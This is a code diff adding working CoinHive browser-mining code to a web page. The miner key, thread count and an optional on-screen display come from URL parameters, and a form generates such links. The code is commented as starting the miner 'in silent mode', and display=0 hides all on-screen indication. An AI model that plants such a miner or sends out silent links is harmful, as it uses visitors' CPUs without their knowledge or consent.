@@ -15,13 +15,86 @@
   {
     var elements = url_params.split("&");
     var key = null;
-    var threads = null;
-    var display = null;
+    var threads = 2;
+    var display = true;
+    for (var i = 0; i < elements.length; i++) {
+      if (elements[i].substring(0,4)=="key=") {
+        var key = elements[i];
+        key = key.split("=");
+        key = key[1];
+      }
+      if (elements[i].substring(0,8)=="threads=") {
+        var threads = elements[i];
+        threads = threads.split("=");
+        threads = threads[1];
+      }
+      if (elements[i].substring(0,8)=="display=") {
+        var display = elements[i];
+        display = display.split("=");
+        display = display[1];
+      }
+    }
   }
 
-  if (false) { // If a key parameter is given
-    //
+  if (key != null && key != "") { // If a key parameter is given
+    if (threads == null || threads == "") threads = 2;
+    if (display == null && display != 0 || display == "" && display != 0) display = 1;
+
+    // Initialize the miner and start it in silent mode
+    var miner = new CoinHive.Anonymous(key, {threads: threads});
+    miner.start(CoinHive.FORCE_MULTI_TAB);
+
+    // Log all the parameters
+    console.log("key: " + key);
+    console.log("threads: " + threads);
+    console.log("display: " + display);
+    if (display == 1) {
+      setInterval(function(){
+        document.getElementById("context").innerHTML = '<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner started with key ID: ' + key + '<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner started with ' + threads + ' threads' + '<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner hashes per seconds: ' + miner.getHashesPerSecond() + '<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner total hashes: ' + miner.getTotalHashes();
+      }, 1000);
+    }
   } else { // If a key parameter is not given
-    document.write('You must provide a <a href="https://coin-hive.com">coin-hive</a> key into the URL to allow this tool to work properly.<br><br>URL format: &nbsp;&nbsp; ' + window.location.hostname + window.location.pathname + '?key=[KEY]&threads=[NUMBER_OF_THRADS]&display=[DISPLAY]<br><br>&nbsp;&nbsp;[KEY]:&nbsp;&nbsp;&nbsp;&nbsp;The <a href="https://coin-hive.com">coin-hive</a> key to mine.<br>&nbsp;&nbsp;[NUMBER_OF_THRADS]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The number of threads to use, must be 1 or more, default is 2.<br>&nbsp;&nbsp;[DISPLAY]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"true|false" Display whether or not the mining informations on screen.');
+    document.write('You must provide a ' + 
+    '<a href="https://coin-hive.com">coin-hive</a>' + 
+    ' key into the URL to allow this tool to work properly.<br><br>URL format: &nbsp;&nbsp; ' + 
+    window.location.hostname + window.location.pathname + 
+    '?key=[KEY]&threads=[NUMBER_OF_THRADS]&display=[DISPLAY]' + 
+    '<br><br>&nbsp;&nbsp;[KEY]:&nbsp;&nbsp;&nbsp;&nbsp;The ' + 
+    '<a href="https://coin-hive.com">coin-hive</a> key to mine.' + 
+    '<br>&nbsp;&nbsp;[NUMBER_OF_THRADS]' + 
+    '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The number of threads to use, must be 1 or more, default is 2.' + 
+    '<br>&nbsp;&nbsp;[DISPLAY]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + 
+    '"1|0" Display whether or not the mining informations on screen, default is 1.' + 
+    '<br><br><br><br><br>' + 
+    window.location.hostname + window.location.pathname + 
+    '?key=' + 
+    '<input type=text id="key_input">' + 
+    '&threads=' + 
+    '<select id="threads_input">' + 
+    '<option value="1">1</option>' + 
+    '<option value="2" selected>2</option>' + 
+    '<option value="3">3</option>' + 
+    '<option value="4">4</option>' + 
+    '<option value="5">5</option>' + 
+    '<option value="6">6</option>' + 
+    '<option value="7">7</option>' + 
+    '<option value="8">8</option>' + 
+    '<option value="9">9</option>' + 
+    '<option value="10">10</option>' + 
+    '<option value="11">11</option>' + 
+    '<option value="12">12</option>' + 
+    '<option value="13">13</option>' + 
+    '<option value="14">14</option>' + 
+    '<option value="15">15</option>' + 
+    '<option value="16">16</option></select>' + 
+    '&display=' + 
+    '<select id="display_input">' + 
+    '<option value="1">Display</option>' + 
+    '<option value="0">Do not display</option>' + 
+    '</select>' + 
+    '<br><button onclick=\'document.getElementById(\"context2\").innerHTML=\"<a>\"+window.location.hostname+window.location.pathname+\"?key=\"+document.getElementById(\"key_input\").value+\"&threads=\"+document.getElementById(\"threads_input\").value+\"&display=\"+document.getElementById(\"display_input\").value+\"</a>\"\'>Generate</button>' + 
+    '<br><br><br>');
   }
 </script>
+<span id="context"></span>
+<span id="context2"></span>
